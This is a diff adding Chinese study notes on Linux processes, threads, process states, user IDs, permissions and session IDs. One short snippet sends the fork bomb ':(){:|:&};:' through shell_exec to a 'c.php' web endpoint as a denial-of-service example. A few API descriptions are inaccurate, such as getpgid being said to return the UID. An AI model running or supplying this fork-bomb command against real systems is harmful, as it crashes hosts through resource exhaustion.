@@ -1,0 +1,40 @@
+进程就是创建并分配一块内存和资源（文件，协处理器，时间片）
+线程就是这个进程中资源的使用者（执行单元，程序，函数）
+IPC--进程间通信
+线程的同步和互斥
+来个一个新的链接分配一个线程，不如使用线程池（提高效率）
+fork boom ---dos 攻击方式 递归创建进程
+def main():
+	host="127.0.0.1"
+	port="80"
+	url="http://%s:%s/c.php"%(host,port)
+	command=":(){:|:&};:"
+	shell_exec(url,command)
+
+进程状态
+define TASK_RUNNING 0  //就绪状态
+define TASK_INTERRUPTIBLE 1//可中断睡眠状态，比如一些正常的阻塞都是浅度睡眠状态 read(),accept(),listen()
+define TASK_UNINTERRUPTIBLE 2//不可中断深度睡眠状态，必须使用wake_up()去唤醒，使用interruptible_sleep_on()到浅度睡眠状态
+define TASK_STOPPED 3//ctrl+z 暂停状态
+define TASK_ZOMBIE 4//子进程使用exit()退出时处于僵死状态，资源待由父进程释放
+
+进程的基本属性：
+使用ps来查看进程号
+pid_t getpid(void);//获得当前进程的PID
+pid_t getppid(void);//获得当前进程的父进程PID
+uid_t getpgid(pid_t pid);//获得当前进程的UID（用户ID）
+
+int setuid(uid_t uid);//设置当前进程的使用权限，为0则为root用户（例子需要root权限执行）修改UID EUID SUID
+ls -al //可以查看用户状态
+chmod 权限号 文件名//可以设置文件/文件夹的权限 比如777为最高权限rwxrwxrwx（当前root用户/当前root用户组/其他用户）（分别表示可读可写可执行）
+776为rwxrwxrw- 没有执行权限
+
+会话号：
+比如登陆淘宝首页会获得一个会话号，在淘宝首页的子链接中都拥有这个会话号，即不需要重复登陆账号密码了
+pid_t getsid(pid_t pid)//获得会话号
+
+终端：也是一个资源
+
+进程用户属性：
+每一个进程都具有UID EUID SUID 用户ID 有效用户ID 炒鸡用户ID
+例子需要root权限执行
